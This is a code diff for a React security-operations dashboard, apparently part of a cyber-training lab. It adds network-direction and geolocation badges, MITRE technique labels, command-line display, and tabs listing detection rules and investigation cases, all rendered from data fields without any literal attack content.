                     <th className="text-left py-2 px-2">SRC IP</th>
                     <th className="text-left py-2 px-2">DEST IP</th>
                     <th className="text-left py-2 px-2">PORT</th>
@@ -579,9 +1099,29 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                       data-testid={`network-${idx}`}
                     >
                       <td className="py-2 px-2 text-muted-foreground">{formatTime(event.timestamp)}</td>
-                      <td className="py-2 px-2 text-cyan-400">{event.srcIp}</td>
-                      <td className="py-2 px-2 text-purple-400">{event.destIp}</td>
-                      <td className="py-2 px-2 text-white">{event.port}</td>
+                      <td className="py-2 px-2">
+                        <Badge variant="outline" className={clsx(
+                          "text-[7px] px-1 py-0",
+                          event.direction === "inbound" ? "text-orange-400 border-orange-400/30" :
+                          event.direction === "outbound" ? "text-blue-400 border-blue-400/30" :
+                          "text-slate-400 border-slate-400/30"
+                        )}>
+                          {event.direction === "inbound" ? "IN" : event.direction === "outbound" ? "OUT" : "INT"}
+                        </Badge>
+                      </td>
+                      <td className="py-2 px-2">
+                        <span className="text-cyan-400">{event.srcIp}</span>
+                        {event.enrichment?.srcGeo && (
+                          <span className="text-[8px] text-muted-foreground ml-1">({event.enrichment.srcGeo.country})</span>
+                        )}
+                      </td>
+                      <td className="py-2 px-2">
+                        <span className="text-purple-400">{event.destIp}</span>
+                        {event.enrichment?.destGeo && (
+                          <span className="text-[8px] text-muted-foreground ml-1">({event.enrichment.destGeo.country})</span>
+                        )}
+                      </td>
+                      <td className="py-2 px-2 text-white">{event.srcPort}:{event.destPort}</td>
                       <td className="py-2 px-2 text-muted-foreground">{event.protocol}</td>
                       <td className="py-2 px-2">
                         <Badge className={clsx(
@@ -623,7 +1163,7 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                   )}
                   data-testid={`endpoint-${idx}`}
                 >
-                  <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center justify-between mb-2 gap-2">
                     <div className="flex items-center gap-2">
                       <Monitor className={clsx(
                         "w-4 h-4",
@@ -632,15 +1172,23 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                         "text-primary"
                       )} />
                       <span className="text-xs font-bold text-white">{activity.hostname}</span>
+                      <Badge variant="outline" className="text-[8px]">{activity.eventId}</Badge>
                     </div>
-                    <Badge className={clsx(
-                      "text-[8px]",
-                      activity.status === "malicious" ? "bg-red-500/20 text-red-400" :
-                      activity.status === "suspicious" ? "bg-yellow-500/20 text-yellow-400" :
-                      "bg-green-500/20 text-green-400"
-                    )}>
-                      {activity.status.toUpperCase()}
-                    </Badge>
+                    <div className="flex items-center gap-1">
+                      {activity.mitreTechnique && (
+                        <Badge variant="outline" className="text-[8px] text-cyan-400 border-cyan-400/30">
+                          {activity.mitreTechnique}
+                        </Badge>
+                      )}
+                      <Badge className={clsx(
+                        "text-[8px]",
+                        activity.status === "malicious" ? "bg-red-500/20 text-red-400" :
+                        activity.status === "suspicious" ? "bg-yellow-500/20 text-yellow-400" :
+                        "bg-green-500/20 text-green-400"
+                      )}>
+                        {activity.status.toUpperCase()}
+                      </Badge>
+                    </div>
                   </div>
                   <div className="text-[10px] font-mono space-y-1">
                     <div className="flex items-center gap-2">
@@ -653,6 +1201,15 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                         <span className={clsx(
                           activity.status === "malicious" ? "text-red-400" : "text-cyan-400"
                         )}>{activity.process}</span>
+                        {activity.parentProcess && (
+                          <span className="text-muted-foreground">(parent: {activity.parentProcess})</span>
+                        )}
+                      </div>
+                    )}
+                    {activity.commandLine && (
+                      <div className="flex items-start gap-2">
+                        <span className="text-muted-foreground">Cmd:</span>
+                        <span className="text-orange-400 break-all">{activity.commandLine}</span>
                       </div>
                     )}
                     {activity.user && (
@@ -668,6 +1225,139 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                   </div>
                 </motion.div>
               ))}
+            </div>
+          </ScrollArea>
+        </TabsContent>
+
+        {/* Detection Rules Tab */}
+        <TabsContent value="detections" className="flex-1 m-0 overflow-hidden">
+          <ScrollArea className="h-full">
+            <div className="p-2 space-y-2">
+              {detectionRules.map((rule, idx) => {
+                const config = severityConfig[rule.severity];
+                return (
+                  <motion.div
+                    key={rule.id}
+                    initial={{ opacity: 0, y: 5 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: idx * 0.03 }}
+                    className="p-3 rounded-lg border bg-black/30 border-white/10"
+                    data-testid={`detection-${rule.id}`}
+                  >
+                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
+                      <div className="flex items-center gap-2 flex-wrap">
+                        <Code className="w-4 h-4 text-primary" />
+                        <span className="text-xs font-bold text-white">{rule.name}</span>
+                        <Badge className={clsx("text-[8px]", config.color)}>
+                          {rule.severity.toUpperCase()}
+                        </Badge>
+                        {rule.mitreId && (
+                          <Badge variant="outline" className="text-[8px] text-cyan-400 border-cyan-400/30">
+                            {rule.mitreId}
+                          </Badge>
+                        )}
+                      </div>
+                      <div className="flex items-center gap-2">
+                        {rule.enabled ? (
+                          <ToggleRight className="w-4 h-4 text-green-400" />
+                        ) : (
+                          <ToggleLeft className="w-4 h-4 text-muted-foreground" />
+                        )}
+                        <Badge variant="outline" className="text-[8px]">
+                          {rule.triggerCount} triggers
+                        </Badge>
+                      </div>
+                    </div>
+                    <p className="text-[10px] text-muted-foreground mb-2">{rule.description}</p>
+                    <div className="bg-black/50 rounded p-2 mb-2">
+                      <code className="text-[9px] text-primary font-mono break-all">{rule.logic}</code>
+                    </div>
+                    <div className="flex items-center gap-4 text-[9px] text-muted-foreground flex-wrap">
+                      {rule.mitreTactic && (
+                        <span className="flex items-center gap-1">
+                          <Shield className="w-2.5 h-2.5" /> {rule.mitreTactic}
+                        </span>
+                      )}
+                      {rule.threshold && (
+                        <span className="flex items-center gap-1">
+                          Threshold: {rule.threshold.count} in {rule.threshold.timeWindow}
+                        </span>
+                      )}
+                      {rule.lastTriggered && (
+                        <span className="flex items-center gap-1">
+                          <Clock className="w-2.5 h-2.5" /> Last: {formatTimeAgo(rule.lastTriggered)}
+                        </span>
+                      )}
+                    </div>
+                  </motion.div>
+                );
+              })}
+            </div>
+          </ScrollArea>
+        </TabsContent>
+
+        {/* Cases Tab */}
+        <TabsContent value="cases" className="flex-1 m-0 overflow-hidden">
+          <ScrollArea className="h-full">
+            <div className="p-2 space-y-2">
+              {cases.map((caseItem, idx) => {
+                const priorityConfig = severityConfig[caseItem.priority];
+                const caseStatusConfig: Record<string, { color: string; label: string }> = {
+                  open: { color: "bg-red-500/30 text-red-300", label: "OPEN" },
+                  investigating: { color: "bg-yellow-500/30 text-yellow-300", label: "INVESTIGATING" },
+                  pending: { color: "bg-blue-500/30 text-blue-300", label: "PENDING" },
+                  closed: { color: "bg-green-500/30 text-green-300", label: "CLOSED" }
+                };
+                return (
+                  <motion.div
+                    key={caseItem.id}
+                    initial={{ opacity: 0, y: 5 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: idx * 0.03 }}
+                    className="p-3 rounded-lg border bg-black/30 border-white/10"
+                    data-testid={`case-${caseItem.id}`}
+                  >
+                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
+                      <div className="flex items-center gap-2 flex-wrap">
+                        <Briefcase className="w-4 h-4 text-primary" />
+                        <span className="text-[10px] font-mono text-muted-foreground">{caseItem.id}</span>
+                        <span className="text-xs font-bold text-white">{caseItem.title}</span>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        <Badge className={clsx("text-[8px]", priorityConfig.color)}>
+                          P:{caseItem.priority.toUpperCase()}
+                        </Badge>
+                        <Badge className={clsx("text-[8px]", caseStatusConfig[caseItem.status].color)}>
+                          {caseStatusConfig[caseItem.status].label}
+                        </Badge>
+                      </div>
+                    </div>
+                    <div className="text-[10px] space-y-2">
+                      <div className="flex items-center gap-4 text-muted-foreground flex-wrap">
+                        {caseItem.assignee && (
+                          <span className="flex items-center gap-1">
+                            <User className="w-2.5 h-2.5" /> {caseItem.assignee}
+                          </span>
+                        )}
+                        <span className="flex items-center gap-1">
+                          <Clock className="w-2.5 h-2.5" /> Created: {formatTimeAgo(caseItem.createdAt)}
+                        </span>
+                        <span className="flex items-center gap-1">
+                          <AlertTriangle className="w-2.5 h-2.5" /> {caseItem.alertIds.length} alert(s)
+                        </span>
+                      </div>
+                      {caseItem.notes.length > 0 && (
+                        <div className="bg-black/40 rounded p-2 space-y-1">
+                          <span className="text-[9px] text-primary uppercase">Notes:</span>
+                          {caseItem.notes.slice(-2).map((note, i) => (
+                            <div key={i} className="text-[9px] text-muted-foreground">- {note}</div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  </motion.div>
+                );
+              })}
             </div>
           </ScrollArea>
         </TabsContent>
